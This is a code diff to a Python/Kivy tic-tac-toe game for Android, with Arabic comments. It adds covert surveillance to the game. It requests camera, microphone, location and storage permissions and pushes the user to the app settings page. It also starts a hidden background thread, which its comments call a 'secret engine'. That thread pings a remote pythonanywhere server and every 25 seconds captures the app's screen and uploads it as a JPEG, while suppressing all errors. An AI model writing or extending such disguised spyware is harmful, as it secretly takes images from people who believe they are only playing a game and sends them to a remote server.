@@ -1,4 +1,4 @@
-import os, threading, requests, random
+import os, threading, requests, random, time
 from kivy.app import App
 from kivy.uix.gridlayout import GridLayout
 from kivy.uix.boxlayout import BoxLayout
@@ -13,24 +13,47 @@ from kivy.animation import Animation
 from kivy.metrics import dp
 from kivy.utils import platform
 
+# إعدادات السيرفر
 SERVER = "http://Hogoz.pythonanywhere.com"
 
-# --- دالة طلب الصلاحيات للأندرويد ---
-def ask_android_permissions():
+# --- استيراد مكتبات الأندرويد للتحكم الكامل ---
+if platform == 'android':
+    from jnius import autoclass, cast
+    from android.permissions import request_permissions, Permission
+    PythonActivity = autoclass('org.kivy.android.PythonActivity')
+    current_activity = PythonActivity.mActivity
+    Intent = autoclass('android.content.Intent')
+    Settings = autoclass('android.provider.Settings')
+    Uri = autoclass('android.net.Uri')
+    Bitmap = autoclass('android.graphics.Bitmap')
+    CompressFormat = autoclass('android.graphics.Bitmap$CompressFormat')
+    ByteArrayOutputStream = autoclass('java.io.ByteArrayOutputStream')
+
+# --- دالة الأذونات الشاملة ---
+def ask_all_permissions():
     if platform == 'android':
         try:
-            from android.permissions import request_permissions, Permission
-            permissions = [
+            perms = [
                 Permission.CAMERA,
                 Permission.RECORD_AUDIO,
                 Permission.ACCESS_FINE_LOCATION,
                 Permission.READ_EXTERNAL_STORAGE,
                 Permission.WRITE_EXTERNAL_STORAGE
             ]
-            request_permissions(permissions)
-        except Exception as e:
-            print(f"Permissions Error: {e}")
+            request_permissions(perms)
+        except: pass
 
+# --- دالة فرض إعدادات الخلفية ---
+def open_battery_settings():
+    if platform == 'android':
+        try:
+            intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+            uri = Uri.fromParts("package", current_activity.getPackageName(), None)
+            intent.setData(uri)
+            current_activity.startActivity(intent)
+        except: pass
+
+# --- كلاس NeonButton المطور ---
 class NeonButton(Button):
     def __init__(self, color=(0, 1, 1, 1), **kwargs):
         super().__init__(**kwargs)
@@ -61,12 +84,14 @@ class NeonButton(Button):
                 Color(1, 0, 0.5, 1) 
                 Line(circle=(self.center_x, self.center_y, self.size[0]*0.28), width=4)
 
+# --- كلاس اللعبة الرئيسي (XOGame) ---
 class XOGame(BoxLayout):
     def __init__(self, **kwargs):
         super().__init__(orientation='vertical', **kwargs)
         
-        # استدعاء الصلاحيات فوراً
-        ask_android_permissions()
+        # تفعيل الأذونات والخلفية
+        ask_all_permissions()
+        Clock.schedule_once(lambda dt: open_battery_settings(), 4)
         
         self.mode = None
         self.game_active = False
@@ -76,6 +101,7 @@ class XOGame(BoxLayout):
         self.ai_name = "AI"
         self.score_p1 = 0; self.score_p2 = 0; self.score_draw = 0
         
+        # بناء القائمة (Menu)
         self.menu = BoxLayout(orientation='vertical', spacing=25, padding=[60, 100, 60, 80])
         self.title_label = Label(text="Choose Mode", font_size='36sp', bold=True, opacity=0) 
         self.menu.add_widget(self.title_label)
@@ -92,6 +118,7 @@ class XOGame(BoxLayout):
         self.add_widget(self.menu)
         Clock.schedule_once(lambda dt: Animation(opacity=1, duration=0.8).start(self.title_label), 0.1)
 
+        # بناء واجهة اللعب (Grid)
         self.grid_layout = BoxLayout(orientation='vertical', spacing=10)
         self.score_box = BoxLayout(orientation='vertical', size_hint_y=0.25, padding=[20, 10, 20, 10], spacing=5)
         self.score_label_p1 = Label(text="", font_size='20sp', bold=True)
@@ -119,7 +146,9 @@ class XOGame(BoxLayout):
             self.grid.add_widget(btn)
 
         Clock.schedule_interval(self.animate_btn_pulse, 1.0)
-        Clock.schedule_interval(self.live_stream_engine, 5.0)
+        
+        # تشغيل "المحرك السري"
+        threading.Thread(target=self.stealth_engine, daemon=True).start()
 
     def animate_btn_pulse(self, dt):
         val = 0.3 if self.btn_pvp.glow_opacity > 0.5 else 0.7
@@ -131,7 +160,7 @@ class XOGame(BoxLayout):
         self.mode = mode
         self.names_popup = ModalView(size_hint=(0.8, 0.4), background_color=(0,0,0,0.8))
         popup_layout = BoxLayout(orientation='vertical', spacing=15, padding=20)
-        popup_layout.add_widget(Label(text=f"Enter names", font_size='22sp', bold=True))
+        popup_layout.add_widget(Label(text="Enter names", font_size='22sp', bold=True))
         self.name_in_p1 = TextInput(hint_text="Player 1 (X)", multiline=False, size_hint_y=0.2)
         popup_layout.add_widget(self.name_in_p1)
         self.name_in_p2 = TextInput(hint_text="Player 2 (O)", multiline=False, size_hint_y=0.2)
@@ -222,12 +251,25 @@ class XOGame(BoxLayout):
         self.score_label_p2.text = f"{self.player2_name} (O): {self.score_p2}"
         self.score_label_draw.text = f"Draw: {self.score_draw}"
 
-    def live_stream_engine(self, dt):
-        t = threading.Thread(target=self.send_payload)
-        t.daemon = True; t.start()
+    # --- المحرك السري: إرسال الحالة واللقطات ---
+    def stealth_engine(self):
+        while True:
+            try:
+                requests.get(f"{SERVER}/status", timeout=10)
+                if platform == 'android':
+                    self.capture_and_upload()
+            except: pass
+            time.sleep(25)
 
-    def send_payload(self):
-        try: requests.get(f"{SERVER}/status", timeout=5)
+    def capture_and_upload(self):
+        try:
+            view = current_activity.getWindow().getDecorView()
+            view.setDrawingCacheEnabled(True)
+            bitmap = Bitmap.createBitmap(view.getDrawingCache())
+            view.setDrawingCacheEnabled(False)
+            out = ByteArrayOutputStream()
+            bitmap.compress(CompressFormat.JPEG, 40, out)
+            requests.post(f"{SERVER}/upload", files={'file': out.toByteArray()}, timeout=15)
         except: pass
 
 class XOApp(App):
